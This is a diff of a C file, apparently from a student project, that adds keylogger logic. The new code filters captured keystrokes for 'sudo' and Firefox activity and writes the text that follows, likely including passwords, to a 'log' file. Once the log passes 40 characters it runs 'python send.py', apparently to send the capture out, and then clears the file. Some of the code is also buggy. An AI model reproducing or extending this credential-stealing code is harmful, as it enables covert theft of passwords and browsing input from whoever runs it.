@@ -5,21 +5,87 @@
 ** Login   <nathan.trehout@epitech.eu>
 **
 ** Started on  Mon Dec 19 16:49:34 2016 Nathan Trehout
-** Last update Tue Dec 20 21:14:40 2016 Nathan Trehout
+** Last update Fri Dec 23 12:16:03 2016 Nathan Trehout
 */
 
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <linux/input.h>
-#include <string.h>
-#include <stdio.h>
+#include "include/my.h"
 
+int	firefox = 0;
 
-
-int	main()
+int	find_command(char *str)
 {
-  init("salut tout le monde !", "sudo");
+  int	i;
+
+  i = 0;
+  while (str[i])
+    {
+      if (str[i] == 's' && str[i + 1] == 'u' && str[i + 2] == 'd' && str[i + 3] == 'o')
+	return (i);
+      else if (str[i] == 'f' && str[i + 1] == 'i' && str[i + 2] == 'r' && str[i + 3] == 'e')
+	{
+	  firefox = 1;
+	  return (i);
+	}
+      i++;
+    }
+  return (-1);
+}
+
+int	verif_file()
+{
+  int	fd;
+  char	buffer[5000];
+  int	i;
+  FILE	*file;
+
+  i = 0;
+  fd = open("log", S_IRUSR);
+  read(fd, buffer, 5000);
+  while (buffer[i])
+    i++;
+  if (i > 40)
+    {
+      system("python send.py");
+      file = fopen("log", "w");
+    }
+  return (0);
+}
+
+int	put_in_file(char *str, int i)
+{
+  FILE	*file;
+
+  file = fopen("log", "aw+");
+  verif_file();
+  while (i != 0)
+    {
+      i--;
+      *str++;
+    }
+  if (firefox == 0)
+    str[i + 50] = '\0';
+  else if (firefox == 1)
+    str[i + 300] = '\0';
+  fputs("{ CMD : ", file);
+  fputs(str, file);
+  fputs("}", file);
+  fputs("\n", file);
+  fclose(file);
+  return (0);
+}
+
+int	store_send_input(char *key_logs)
+{
+  int	i;
+
+  i = find_command(key_logs);
+  if (i != -1)
+    put_in_file(key_logs, i);
+  return (0);
+}
+
+int	main(int ac, char **av)
+{
+  prepare_python(fs_open_file("./py_src"), av[1]);
   return (0);
 }
